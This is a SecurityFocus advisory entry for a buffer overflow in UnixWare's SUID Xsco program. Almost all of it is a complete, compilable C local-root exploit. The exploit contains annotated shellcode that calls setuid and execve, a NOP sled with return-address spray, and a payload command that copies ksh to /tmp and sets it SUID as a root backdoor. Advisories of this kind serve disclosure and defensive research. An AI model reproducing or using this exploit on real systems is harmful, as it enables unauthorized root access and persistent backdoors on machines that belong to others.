source: http://www.securityfocus.com/bid/824/info

Under certain versions of Unixware, the SUID program Xsco is vulnerable to a buffer overflow attack. The problem lies in that Xsco does not sanity check user supplied data. 

// UnixWare7 /usr/X/bin/Xsco local, K2/cheez
//
// Xsco produces some strange side effect's with the execve; it seems
// that commands can not be run interactively.  Thanks to cheez for the
// shellcode.

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char shell[] =
/*   0 */ "\xeb\x5f"                         /* jmp springboard       */
/* syscall:                                                           */
/*   2 */ "\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0         */
/*   9 */ "\xc3"                             /* ret                   */
/* start:                                                             */
/*  10 */ "\x5e"                             /* popl %esi             */
/*  11 */ "\x31\xc0"                         /* xor %eax,%eax         */
/*  13 */ "\x89\x46\x9d"                     /* movl %eax,-0x63(%esi) */
/*  16 */ "\x88\x46\xa2"                     /* movb %al,-0x5e(%esi)  */
/* seteuid:                                                           */
/*  19 */ "\x31\xc0"                         /* xor %eax,%eax         */
/*  21 */ "\x50"                             /* pushl %eax            */
/*  22 */ "\xb0\x8d"                         /* movb $0x8d,%al        */
/*  24 */ "\xe8\xe5\xff\xff\xff"             /* call syscall          */
/*  29 */ "\x83\xc4\x04"                     /* addl $0x4,%esp        */
/* setuid:                                                            */
/*  32 */ "\x31\xc0"                         /* xor %eax,%eax         */
/*  34 */ "\x50"                             /* pushl %eax            */
/*  35 */ "\xb0\x17"                         /* movb $0x17,%al        */
/*  37 */ "\xe8\xd8\xff\xff\xff"             /* call syscall          */
/*  42 */ "\x83\xc4\x04"                     /* addl $0x4,%esp        */
/* execve:                                                            */
/*  45 */ "\x31\xc0"                         /* xor %eax,%eax         */
/*  47 */ "\x50"                             /* pushl %eax            */
/*  48 */ "\x56"                             /* pushl %esi            */
/*  49 */ "\x8b\x1e"                         /* movl (%esi),%ebx      */
/*  51 */ "\xf7\xdb"                         /* negl %ebx             */
/*  53 */ "\x89\xf7"                         /* movl %esi,%edi        */
/*  55 */ "\x83\xc7\x10"                     /* addl $0x10,%edi       */
/*  58 */ "\x57"                             /* pushl %edi            */
/*  59 */ "\x89\x3e"                         /* movl %edi,(%esi)      */
/*  61 */ "\x83\xc7\x08"                     /* addl $0x8,%edi        */
/*  64 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
/*  67 */ "\x89\x7e\x04"                     /* movl %edi,0x4(%esi)   */
/*  70 */ "\x83\xc7\x03"                     /* addl $0x3,%edi        */
/*  73 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
/*  76 */ "\x89\x7e\x08"                     /* movl %edi,0x8(%esi)   */
/*  79 */ "\x01\xdf"                         /* addl %ebx,%edi        */
/*  81 */ "\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
/*  84 */ "\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
/*  87 */ "\xb0\x3b"                         /* movb $0x3b,%al        */
/*  89 */ "\xe8\xa4\xff\xff\xff"             /* call syscall          */
/*  94 */ "\x83\xc4\x0c"                     /* addl $0xc,%esp        */
/* springboard:                                                       */
/*  97 */ "\xe8\xa4\xff\xff\xff"             /* call start            */
/* data:                                                              */
/* 102 */ "\xff\xff\xff\xff"                 /* DATA                  */
/* 106 */ "\xff\xff\xff\xff"                 /* DATA                  */
/* 110 */ "\xff\xff\xff\xff"                 /* DATA                  */
/* 114 */ "\xff\xff\xff\xff"                 /* DATA                  */
/* 118 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                  */
/* 126 */ "\x2d\x63\xff";                    /* DATA                  */

#define SIZE 600
#define NOPDEF 101
#define DEFOFF -240
#define LEN 102

const char x86_nop=0x90;
long nop=NOPDEF,esp;
long offset=DEFOFF;
char buffer[SIZE];

long get_esp() { __asm__("movl %esp,%eax"); }

int main (int argc, char *argv[]) {
    int i,len;
    char *cmd = "cp /bin/ksh /tmp;chmod 4555 /tmp/ksh";

    memset(buffer, x86_nop, SIZE);

    len = strlen(cmd); len++; len = -len;
    shell[LEN+0] = (len >>  0) & 0xff;
    shell[LEN+1] = (len >>  8) & 0xff;
    shell[LEN+2] = (len >> 16) & 0xff;
    shell[LEN+3] = (len >> 24) & 0xff;

    if (argc > 1) offset += strtol(argv[1], NULL, 0);
    if (argc > 2) nop += strtoul(argv[2], NULL, 0);
    esp = get_esp();

    buffer[0]=':';
    memcpy(buffer+nop, shell, strlen(shell));
    memcpy(buffer+nop+strlen(shell), cmd,strlen(cmd));
    memcpy(buffer+nop+strlen(shell)+strlen(cmd),"\xff",1);
    for (i = nop+strlen(shell)+1+strlen(cmd); i < SIZE-4; i += 4) {
        *((int *) &buffer[i]) = esp+offset;
    }

    printf("jmp = [0x%x]\toffset = [%d]\tnop = [%d]\n",esp+offset,offset, nop);
    execl("/usr/X/bin/Xsco", "Xsco", buffer, NULL);

    printf("exec failed!\n");
    return 0;
}